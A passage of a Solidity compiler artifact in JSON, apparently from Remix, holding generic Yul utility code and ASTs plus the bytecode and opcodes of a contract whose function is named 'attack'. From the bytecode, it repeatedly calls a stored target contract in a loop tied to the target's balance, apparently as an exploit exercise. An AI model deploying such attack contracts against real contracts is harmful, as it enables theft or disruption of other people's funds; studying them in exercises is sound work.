									"contents": "{\n\n    function allocate_unbounded() -> memPtr {\n        memPtr := mload(64)\n    }\n\n    function revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() {\n        revert(0, 0)\n    }\n\n    function revert_error_c1322bf8034eace5e0b5c7295db60986aa89aae5e0ea0873e4689e076861a5db() {\n        revert(0, 0)\n    }\n\n    function cleanup_t_uint160(value) -> cleaned {\n        cleaned := and(value, 0xffffffffffffffffffffffffffffffffffffffff)\n    }\n\n    function cleanup_t_address(value) -> cleaned {\n        cleaned := cleanup_t_uint160(value)\n    }\n\n    function validator_revert_t_address(value) {\n        if iszero(eq(value, cleanup_t_address(value))) { revert(0, 0) }\n    }\n\n    function abi_decode_t_address_fromMemory(offset, end) -> value {\n        value := mload(offset)\n        validator_revert_t_address(value)\n    }\n\n    function abi_decode_tuple_t_address_fromMemory(headStart, dataEnd) -> value0 {\n        if slt(sub(dataEnd, headStart), 32) { revert_error_dbdddcbe895c83990c08b3492a0e83918d802a52331272ac6fdb6a7c4aea3b1b() }\n\n        {\n\n            let offset := 0\n\n            value0 := abi_decode_t_address_fromMemory(add(headStart, offset), dataEnd)\n        }\n\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"linkReferences": {},
							"object": "608060405262c6800060015560405161037b38038061037b833981810160405281019061002c91906100d5565b806000806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555050610102565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006100a282610077565b9050919050565b6100b281610097565b81146100bd57600080fd5b50565b6000815190506100cf816100a9565b92915050565b6000602082840312156100eb576100ea610072565b5b60006100f9848285016100c0565b91505092915050565b61026a806101116000396000f3fe608060405261000c61000e565b005b5b60008060009054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff16311061016d5760008054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff166001546040516024016100999190610188565b6040516020818303038152906040527f8ba14562000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050604051610123919061021d565b6000604051808303816000865af19150503d8060008114610160576040519150601f19603f3d011682016040523d82523d6000602084013e610165565b606091505b50505061000f565b565b6000819050919050565b6101828161016f565b82525050565b600060208201905061019d6000830184610179565b92915050565b600081519050919050565b600081905092915050565b60005b838110156101d75780820151818401526020810190506101bc565b838111156101e6576000848401525b50505050565b60006101f7826101a3565b61020181856101ae565b93506102118185602086016101b9565b80840191505092915050565b600061022982846101ec565b91508190509291505056fea264697066735822122008832061b007063726229aea01da18f2a78ad390f033441ca3727eeac422febd64736f6c634300080f0033",
							"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE PUSH3 0xC68000 PUSH1 0x1 SSTORE PUSH1 0x40 MLOAD PUSH2 0x37B CODESIZE SUB DUP1 PUSH2 0x37B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x2C SWAP2 SWAP1 PUSH2 0xD5 JUMP JUMPDEST DUP1 PUSH1 0x0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x102 JUMP JUMPDEST PUSH1 0x0 DUP1 REVERT JUMPDEST PUSH1 0x0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0xA2 DUP3 PUSH2 0x77 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0xB2 DUP2 PUSH2 0x97 JUMP JUMPDEST DUP2 EQ PUSH2 0xBD JUMPI PUSH1 0x0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP PUSH2 0xCF DUP2 PUSH2 0xA9 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0xEB JUMPI PUSH2 0xEA PUSH2 0x72 JUMP JUMPDEST JUMPDEST PUSH1 0x0 PUSH2 0xF9 DUP5 DUP3 DUP6 ADD PUSH2 0xC0 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x26A DUP1 PUSH2 0x111 PUSH1 0x0 CODECOPY PUSH1 0x0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE PUSH2 0xC PUSH2 0xE JUMP JUMPDEST STOP JUMPDEST JUMPDEST PUSH1 0x0 DUP1 PUSH1 0x0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND BALANCE LT PUSH2 0x16D JUMPI PUSH1 0x0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 SLOAD PUSH1 0x40 MLOAD PUSH1 0x24 ADD PUSH2 0x99 SWAP2 SWAP1 PUSH2 0x188 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH1 0x20 DUP2 DUP4 SUB SUB DUP2 MSTORE SWAP1 PUSH1 0x40 MSTORE PUSH32 0x8BA1456200000000000000000000000000000000000000000000000000000000 PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF NOT AND PUSH1 0x20 DUP3 ADD DUP1 MLOAD PUSH28 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP4 DUP2 DUP4 AND OR DUP4 MSTORE POP POP POP POP PUSH1 0x40 MLOAD PUSH2 0x123 SWAP2 SWAP1 PUSH2 0x21D JUMP JUMPDEST PUSH1 0x0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH1 0x0 DUP7 GAS CALL SWAP2 POP POP RETURNDATASIZE DUP1 PUSH1 0x0 DUP2 EQ PUSH2 0x160 JUMPI PUSH1 0x40 MLOAD SWAP2 POP PUSH1 0x1F NOT PUSH1 0x3F RETURNDATASIZE ADD AND DUP3 ADD PUSH1 0x40 MSTORE RETURNDATASIZE DUP3 MSTORE RETURNDATASIZE PUSH1 0x0 PUSH1 0x20 DUP5 ADD RETURNDATACOPY PUSH2 0x165 JUMP JUMPDEST PUSH1 0x60 SWAP2 POP JUMPDEST POP POP POP PUSH2 0xF JUMP JUMPDEST JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x182 DUP2 PUSH2 0x16F JUMP JUMPDEST DUP3 MSTORE POP POP JUMP JUMPDEST PUSH1 0x0 PUSH1 0x20 DUP3 ADD SWAP1 POP PUSH2 0x19D PUSH1 0x0 DUP4 ADD DUP5 PUSH2 0x179 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 DUP2 MLOAD SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH1 0x0 DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 JUMPDEST DUP4 DUP2 LT ISZERO PUSH2 0x1D7 JUMPI DUP1 DUP3 ADD MLOAD DUP2 DUP5 ADD MSTORE PUSH1 0x20 DUP2 ADD SWAP1 POP PUSH2 0x1BC JUMP JUMPDEST DUP4 DUP2 GT ISZERO PUSH2 0x1E6 JUMPI PUSH1 0x0 DUP5 DUP5 ADD MSTORE JUMPDEST POP POP POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x1F7 DUP3 PUSH2 0x1A3 JUMP JUMPDEST PUSH2 0x201 DUP2 DUP6 PUSH2 0x1AE JUMP JUMPDEST SWAP4 POP PUSH2 0x211 DUP2 DUP6 PUSH1 0x20 DUP7 ADD PUSH2 0x1B9 JUMP JUMPDEST DUP1 DUP5 ADD SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH1 0x0 PUSH2 0x229 DUP3 DUP5 PUSH2 0x1EC JUMP JUMPDEST SWAP2 POP DUP2 SWAP1 POP SWAP3 SWAP2 POP POP JUMP INVALID LOG2 PUSH5 0x6970667358 0x22 SLT KECCAK256 ADDMOD DUP4 KECCAK256 PUSH2 0xB007 MOD CALLDATACOPY 0x26 0x22 SWAP11 0xEA ADD 0xDA XOR CALLCODE 0xA7 DUP11 0xD3 SWAP1 CREATE CALLER DIFFICULTY SHR LOG3 PUSH19 0x7EEAC422FEBD64736F6C634300080F00330000 ",
							"sourceMap": "60:492:0:-:0;;;149:8;133:24;;166:120;;;;;;;;;;;;;;;;;;;;;:::i;:::-;256:22;230:23;;:48;;;;;;;;;;;;;;;;;;166:120;60:492;;88:117:1;197:1;194;187:12;334:126;371:7;411:42;404:5;400:54;389:65;;334:126;;;:::o;466:96::-;503:7;532:24;550:5;532:24;:::i;:::-;521:35;;466:96;;;:::o;568:122::-;641:24;659:5;641:24;:::i;:::-;634:5;631:35;621:63;;680:1;677;670:12;621:63;568:122;:::o;696:143::-;753:5;784:6;778:13;769:22;;800:33;827:5;800:33;:::i;:::-;696:143;;;;:::o;845:351::-;915:6;964:2;952:9;943:7;939:23;935:32;932:119;;;970:79;;:::i;:::-;932:119;1090:1;1115:64;1171:7;1162:6;1151:9;1147:22;1115:64;:::i;:::-;1105:74;;1061:128;845:351;;;;:::o;60:492:0:-;;;;;;;"
						},
						"deployedBytecode": {
							"functionDebugData": {
								"@_43": {
									"entryPoint": null,
									"id": 43,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"@attack_36": {
									"entryPoint": 14,
									"id": 36,
									"parameterSlots": 0,
									"returnSlots": 0
								},
								"abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 492,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_t_uint256_to_t_uint256_fromStack": {
									"entryPoint": 377,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 0
								},
								"abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed": {
									"entryPoint": 541,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed": {
									"entryPoint": 392,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"array_length_t_bytes_memory_ptr": {
									"entryPoint": 419,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack": {
									"entryPoint": 430,
									"id": null,
									"parameterSlots": 2,
									"returnSlots": 1
								},
								"cleanup_t_uint256": {
									"entryPoint": 367,
									"id": null,
									"parameterSlots": 1,
									"returnSlots": 1
								},
								"copy_memory_to_memory": {
									"entryPoint": 441,
									"id": null,
									"parameterSlots": 3,
									"returnSlots": 0
								}
							},
							"generatedSources": [
								{
									"ast": {
										"nodeType": "YulBlock",
										"src": "0:1665:1",
										"statements": [
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "52:32:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "62:16:1",
															"value": {
																"name": "value",
																"nodeType": "YulIdentifier",
																"src": "73:5:1"
															},
															"variableNames": [
																{
																	"name": "cleaned",
																	"nodeType": "YulIdentifier",
																	"src": "62:7:1"
																}
															]
														}
													]
												},
												"name": "cleanup_t_uint256",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "34:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "cleaned",
														"nodeType": "YulTypedName",
														"src": "44:7:1",
														"type": ""
													}
												],
												"src": "7:77:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "155:53:1",
													"statements": [
														{
															"expression": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "172:3:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "195:5:1"
																			}
																		],
																		"functionName": {
																			"name": "cleanup_t_uint256",
																			"nodeType": "YulIdentifier",
																			"src": "177:17:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "177:24:1"
																	}
																],
																"functionName": {
																	"name": "mstore",
																	"nodeType": "YulIdentifier",
																	"src": "165:6:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "165:37:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "165:37:1"
														}
													]
												},
												"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "143:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "150:3:1",
														"type": ""
													}
												],
												"src": "90:118:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "312:124:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "322:26:1",
															"value": {
																"arguments": [
																	{
																		"name": "headStart",
																		"nodeType": "YulIdentifier",
																		"src": "334:9:1"
																	},
																	{
																		"kind": "number",
																		"nodeType": "YulLiteral",
																		"src": "345:2:1",
																		"type": "",
																		"value": "32"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "330:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "330:18:1"
															},
															"variableNames": [
																{
																	"name": "tail",
																	"nodeType": "YulIdentifier",
																	"src": "322:4:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "402:6:1"
																	},
																	{
																		"arguments": [
																			{
																				"name": "headStart",
																				"nodeType": "YulIdentifier",
																				"src": "415:9:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "426:1:1",
																				"type": "",
																				"value": "0"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "411:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "411:17:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_uint256_to_t_uint256_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "358:43:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "358:71:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "358:71:1"
														}
													]
												},
												"name": "abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "headStart",
														"nodeType": "YulTypedName",
														"src": "284:9:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "296:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "tail",
														"nodeType": "YulTypedName",
														"src": "307:4:1",
														"type": ""
													}
												],
												"src": "214:222:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "500:40:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "511:22:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "527:5:1"
																	}
																],
																"functionName": {
																	"name": "mload",
																	"nodeType": "YulIdentifier",
																	"src": "521:5:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "521:12:1"
															},
															"variableNames": [
																{
																	"name": "length",
																	"nodeType": "YulIdentifier",
																	"src": "511:6:1"
																}
															]
														}
													]
												},
												"name": "array_length_t_bytes_memory_ptr",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "483:5:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "493:6:1",
														"type": ""
													}
												],
												"src": "442:98:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "659:34:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "669:18:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "684:3:1"
															},
															"variableNames": [
																{
																	"name": "updated_pos",
																	"nodeType": "YulIdentifier",
																	"src": "669:11:1"
																}
															]
														}
													]
												},
												"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "631:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "636:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "updated_pos",
														"nodeType": "YulTypedName",
														"src": "647:11:1",
														"type": ""
													}
												],
												"src": "546:147:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "748:258:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "758:10:1",
															"value": {
																"kind": "number",
																"nodeType": "YulLiteral",
																"src": "767:1:1",
																"type": "",
																"value": "0"
															},
															"variables": [
																{
																	"name": "i",
																	"nodeType": "YulTypedName",
																	"src": "762:1:1",
																	"type": ""
																}
															]
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "827:63:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "852:3:1"
																						},
																						{
																							"name": "i",
																							"nodeType": "YulIdentifier",
																							"src": "857:1:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "848:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "848:11:1"
																				},
																				{
																					"arguments": [
																						{
																							"arguments": [
																								{
																									"name": "src",
																									"nodeType": "YulIdentifier",
																									"src": "871:3:1"
																								},
																								{
																									"name": "i",
																									"nodeType": "YulIdentifier",
																									"src": "876:1:1"
																								}
																							],
																							"functionName": {
																								"name": "add",
																								"nodeType": "YulIdentifier",
																								"src": "867:3:1"
																							},
																							"nodeType": "YulFunctionCall",
																							"src": "867:11:1"
																						}
																					],
																					"functionName": {
																						"name": "mload",
																						"nodeType": "YulIdentifier",
																						"src": "861:5:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "861:18:1"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "841:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "841:39:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "841:39:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "788:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "791:6:1"
																	}
																],
																"functionName": {
																	"name": "lt",
																	"nodeType": "YulIdentifier",
																	"src": "785:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "785:13:1"
															},
															"nodeType": "YulForLoop",
															"post": {
																"nodeType": "YulBlock",
																"src": "799:19:1",
																"statements": [
																	{
																		"nodeType": "YulAssignment",
																		"src": "801:15:1",
																		"value": {
																			"arguments": [
																				{
																					"name": "i",
																					"nodeType": "YulIdentifier",
																					"src": "810:1:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "813:2:1",
																					"type": "",
																					"value": "32"
																				}
																			],
																			"functionName": {
																				"name": "add",
																				"nodeType": "YulIdentifier",
																				"src": "806:3:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "806:10:1"
																		},
																		"variableNames": [
																			{
																				"name": "i",
																				"nodeType": "YulIdentifier",
																				"src": "801:1:1"
																			}
																		]
																	}
																]
															},
															"pre": {
																"nodeType": "YulBlock",
																"src": "781:3:1",
																"statements": []
															},
															"src": "777:113:1"
														},
														{
															"body": {
																"nodeType": "YulBlock",
																"src": "924:76:1",
																"statements": [
																	{
																		"expression": {
																			"arguments": [
																				{
																					"arguments": [
																						{
																							"name": "dst",
																							"nodeType": "YulIdentifier",
																							"src": "974:3:1"
																						},
																						{
																							"name": "length",
																							"nodeType": "YulIdentifier",
																							"src": "979:6:1"
																						}
																					],
																					"functionName": {
																						"name": "add",
																						"nodeType": "YulIdentifier",
																						"src": "970:3:1"
																					},
																					"nodeType": "YulFunctionCall",
																					"src": "970:16:1"
																				},
																				{
																					"kind": "number",
																					"nodeType": "YulLiteral",
																					"src": "988:1:1",
																					"type": "",
																					"value": "0"
																				}
																			],
																			"functionName": {
																				"name": "mstore",
																				"nodeType": "YulIdentifier",
																				"src": "963:6:1"
																			},
																			"nodeType": "YulFunctionCall",
																			"src": "963:27:1"
																		},
																		"nodeType": "YulExpressionStatement",
																		"src": "963:27:1"
																	}
																]
															},
															"condition": {
																"arguments": [
																	{
																		"name": "i",
																		"nodeType": "YulIdentifier",
																		"src": "905:1:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "908:6:1"
																	}
																],
																"functionName": {
																	"name": "gt",
																	"nodeType": "YulIdentifier",
																	"src": "902:2:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "902:13:1"
															},
															"nodeType": "YulIf",
															"src": "899:101:1"
														}
													]
												},
												"name": "copy_memory_to_memory",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "src",
														"nodeType": "YulTypedName",
														"src": "730:3:1",
														"type": ""
													},
													{
														"name": "dst",
														"nodeType": "YulTypedName",
														"src": "735:3:1",
														"type": ""
													},
													{
														"name": "length",
														"nodeType": "YulTypedName",
														"src": "740:6:1",
														"type": ""
													}
												],
												"src": "699:307:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1120:265:1",
													"statements": [
														{
															"nodeType": "YulVariableDeclaration",
															"src": "1130:52:1",
															"value": {
																"arguments": [
																	{
																		"name": "value",
																		"nodeType": "YulIdentifier",
																		"src": "1176:5:1"
																	}
																],
																"functionName": {
																	"name": "array_length_t_bytes_memory_ptr",
																	"nodeType": "YulIdentifier",
																	"src": "1144:31:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1144:38:1"
															},
															"variables": [
																{
																	"name": "length",
																	"nodeType": "YulTypedName",
																	"src": "1134:6:1",
																	"type": ""
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1191:95:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1274:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1279:6:1"
																	}
																],
																"functionName": {
																	"name": "array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1198:75:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1198:88:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1191:3:1"
																}
															]
														},
														{
															"expression": {
																"arguments": [
																	{
																		"arguments": [
																			{
																				"name": "value",
																				"nodeType": "YulIdentifier",
																				"src": "1321:5:1"
																			},
																			{
																				"kind": "number",
																				"nodeType": "YulLiteral",
																				"src": "1328:4:1",
																				"type": "",
																				"value": "0x20"
																			}
																		],
																		"functionName": {
																			"name": "add",
																			"nodeType": "YulIdentifier",
																			"src": "1317:3:1"
																		},
																		"nodeType": "YulFunctionCall",
																		"src": "1317:16:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1335:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1340:6:1"
																	}
																],
																"functionName": {
																	"name": "copy_memory_to_memory",
																	"nodeType": "YulIdentifier",
																	"src": "1295:21:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1295:52:1"
															},
															"nodeType": "YulExpressionStatement",
															"src": "1295:52:1"
														},
														{
															"nodeType": "YulAssignment",
															"src": "1356:23:1",
															"value": {
																"arguments": [
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1367:3:1"
																	},
																	{
																		"name": "length",
																		"nodeType": "YulIdentifier",
																		"src": "1372:6:1"
																	}
																],
																"functionName": {
																	"name": "add",
																	"nodeType": "YulIdentifier",
																	"src": "1363:3:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1363:16:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1356:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "value",
														"nodeType": "YulTypedName",
														"src": "1101:5:1",
														"type": ""
													},
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1108:3:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1116:3:1",
														"type": ""
													}
												],
												"src": "1012:373:1"
											},
											{
												"body": {
													"nodeType": "YulBlock",
													"src": "1525:137:1",
													"statements": [
														{
															"nodeType": "YulAssignment",
															"src": "1536:100:1",
															"value": {
																"arguments": [
																	{
																		"name": "value0",
																		"nodeType": "YulIdentifier",
																		"src": "1623:6:1"
																	},
																	{
																		"name": "pos",
																		"nodeType": "YulIdentifier",
																		"src": "1632:3:1"
																	}
																],
																"functionName": {
																	"name": "abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack",
																	"nodeType": "YulIdentifier",
																	"src": "1543:79:1"
																},
																"nodeType": "YulFunctionCall",
																"src": "1543:93:1"
															},
															"variableNames": [
																{
																	"name": "pos",
																	"nodeType": "YulIdentifier",
																	"src": "1536:3:1"
																}
															]
														},
														{
															"nodeType": "YulAssignment",
															"src": "1646:10:1",
															"value": {
																"name": "pos",
																"nodeType": "YulIdentifier",
																"src": "1653:3:1"
															},
															"variableNames": [
																{
																	"name": "end",
																	"nodeType": "YulIdentifier",
																	"src": "1646:3:1"
																}
															]
														}
													]
												},
												"name": "abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed",
												"nodeType": "YulFunctionDefinition",
												"parameters": [
													{
														"name": "pos",
														"nodeType": "YulTypedName",
														"src": "1504:3:1",
														"type": ""
													},
													{
														"name": "value0",
														"nodeType": "YulTypedName",
														"src": "1510:6:1",
														"type": ""
													}
												],
												"returnVariables": [
													{
														"name": "end",
														"nodeType": "YulTypedName",
														"src": "1521:3:1",
														"type": ""
													}
												],
												"src": "1391:271:1"
											}
										]
									},
									"contents": "{\n\n    function cleanup_t_uint256(value) -> cleaned {\n        cleaned := value\n    }\n\n    function abi_encode_t_uint256_to_t_uint256_fromStack(value, pos) {\n        mstore(pos, cleanup_t_uint256(value))\n    }\n\n    function abi_encode_tuple_t_uint256__to_t_uint256__fromStack_reversed(headStart , value0) -> tail {\n        tail := add(headStart, 32)\n\n        abi_encode_t_uint256_to_t_uint256_fromStack(value0,  add(headStart, 0))\n\n    }\n\n    function array_length_t_bytes_memory_ptr(value) -> length {\n\n        length := mload(value)\n\n    }\n\n    function array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length) -> updated_pos {\n        updated_pos := pos\n    }\n\n    function copy_memory_to_memory(src, dst, length) {\n        let i := 0\n        for { } lt(i, length) { i := add(i, 32) }\n        {\n            mstore(add(dst, i), mload(add(src, i)))\n        }\n        if gt(i, length)\n        {\n            // clear end\n            mstore(add(dst, length), 0)\n        }\n    }\n\n    function abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value, pos) -> end {\n        let length := array_length_t_bytes_memory_ptr(value)\n        pos := array_storeLengthForEncoding_t_bytes_memory_ptr_nonPadded_inplace_fromStack(pos, length)\n        copy_memory_to_memory(add(value, 0x20), pos, length)\n        end := add(pos, length)\n    }\n\n    function abi_encode_tuple_packed_t_bytes_memory_ptr__to_t_bytes_memory_ptr__nonPadded_inplace_fromStack_reversed(pos , value0) -> end {\n\n        pos := abi_encode_t_bytes_memory_ptr_to_t_bytes_memory_ptr_nonPadded_inplace_fromStack(value0,  pos)\n\n        end := pos\n    }\n\n}\n",
									"id": 1,
									"language": "Yul",
									"name": "#utility.yul"
								}
							],
							"immutableReferences": {},
							"linkReferences": {},
